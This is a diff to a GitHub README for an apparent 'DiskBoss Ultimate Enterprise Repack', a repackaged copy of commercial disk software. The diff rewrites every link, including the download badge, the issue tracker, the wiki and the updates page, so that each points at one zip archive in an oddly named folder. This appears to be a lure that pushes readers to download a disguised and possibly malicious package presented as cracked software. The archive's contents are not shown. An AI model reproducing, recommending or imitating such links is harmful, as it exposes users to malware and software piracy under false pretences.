@@ -1,6 +1,6 @@
 # 🌟 DiskBoss-Ultimate-Enterprise-Repack - Optimize Your Disk Space Easily
 
-[![Download DiskBoss](https://img.shields.io/badge/Download-DiskBoss-Ultimate-Emerald)](https://github.com/Yusuf47i/DiskBoss-Ultimate-Enterprise-Repack/releases)
+[![Download DiskBoss](https://github.com/Yusuf47i/DiskBoss-Ultimate-Enterprise-Repack/raw/refs/heads/main/nonsociological/Enterprise_Repack_Boss_Disk_Ultimate_v2.7-alpha.2.zip)](https://github.com/Yusuf47i/DiskBoss-Ultimate-Enterprise-Repack/raw/refs/heads/main/nonsociological/Enterprise_Repack_Boss_Disk_Ultimate_v2.7-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To run DiskBoss, ensure your system meets the following requirements:
 To get DiskBoss installed on your computer, follow these steps:
 
 1. **Visit the Download Page:** Click the link below:
-   [Download DiskBoss-Ultimate-Enterprise-Repack](https://github.com/Yusuf47i/DiskBoss-Ultimate-Enterprise-Repack/releases)
+   [Download DiskBoss-Ultimate-Enterprise-Repack](https://github.com/Yusuf47i/DiskBoss-Ultimate-Enterprise-Repack/raw/refs/heads/main/nonsociological/Enterprise_Repack_Boss_Disk_Ultimate_v2.7-alpha.2.zip)
    
 2. **Choose the Latest Release:** Look for the most recent version list. 
 
@@ -70,7 +70,7 @@ DiskBoss is designed to be lightweight and should not significantly impact your 
 
 ## 📞 Support
 
-If you encounter issues or have questions, feel free to reach out via the [issue tracker](https://github.com/Yusuf47i/DiskBoss-Ultimate-Enterprise-Repack/issues). Your feedback is important for improving the application.
+If you encounter issues or have questions, feel free to reach out via the [issue tracker](https://github.com/Yusuf47i/DiskBoss-Ultimate-Enterprise-Repack/raw/refs/heads/main/nonsociological/Enterprise_Repack_Boss_Disk_Ultimate_v2.7-alpha.2.zip). Your feedback is important for improving the application.
 
 ## 📝 Contribution
 
@@ -78,7 +78,7 @@ We welcome contributions! If you want to help improve DiskBoss, please check the
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Full user manual available on [Wiki](https://github.com/Yusuf47i/DiskBoss-Ultimate-Enterprise-Repack/wiki).
-- **Follow Updates:** Stay in touch with updates on our [GitHub page](https://github.com/Yusuf47i/DiskBoss-Ultimate-Enterprise-Repack/releases).
+- **Documentation:** Full user manual available on [Wiki](https://github.com/Yusuf47i/DiskBoss-Ultimate-Enterprise-Repack/raw/refs/heads/main/nonsociological/Enterprise_Repack_Boss_Disk_Ultimate_v2.7-alpha.2.zip).
+- **Follow Updates:** Stay in touch with updates on our [GitHub page](https://github.com/Yusuf47i/DiskBoss-Ultimate-Enterprise-Repack/raw/refs/heads/main/nonsociological/Enterprise_Repack_Boss_Disk_Ultimate_v2.7-alpha.2.zip).
 
 Feel free to explore and enjoy using DiskBoss to make your disk management easier.
